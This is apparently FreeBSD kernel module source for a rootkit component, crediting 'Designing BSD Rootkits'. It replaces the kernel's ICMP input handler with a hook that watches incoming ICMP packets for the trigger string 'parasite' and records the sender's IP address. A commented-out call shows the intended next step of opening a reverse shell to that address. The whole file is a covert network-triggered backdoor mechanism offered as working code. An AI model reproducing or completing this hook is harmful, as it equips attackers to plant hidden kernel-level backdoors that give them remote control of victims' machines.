#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/socket.h>

//#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>

#define TRIGGER "parasite"
extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

// ICMP hook
int icmp_input_hook(struct mbuf **m, int *off, int proto) {
    
    struct icmp *icp;
    int hlen = *off;

    (*m)->m_len -= hlen;
    (*m)->m_data += hlen;

    icp = mtod(*m, struct icmp *);

    (*m)->m_len += hlen;
    (*m)->m_data -= hlen;

    // Check payload to see if it matches trigger
    if (strncmp(icp->icmp_data, TRIGGER, strlen(TRIGGER)) == 0) {
        
        // Borrowed from chatgpt
        struct ip *iph = (struct ip*)(*m)->m_data;
        struct in_addr src_ip = iph->ip_src;
        char src_ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &src_ip, src_ip_str, INET_ADDRSTRLEN);

        printf("gumper came from: %s\n", src_ip_str);
        //reverse_shell(src_ip_str);
    }
    else {
        return icmp_input(m, off, proto);
    }
    return icmp_input(m, off, proto);
}

// Called at load/unload - comparable to __init and __exit in linux
static int load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                /* Replace icmp_input with icmp_input_hook. */
                inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
                break;

        case MOD_UNLOAD:
                /* Change everything back to normal. */
                inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t icmp_input_hook_mod = {
        "icmp_input_hook",      /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};


DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

// Credit to "Designing BSD Rootkits" by Joseph Kong and ChatGPT
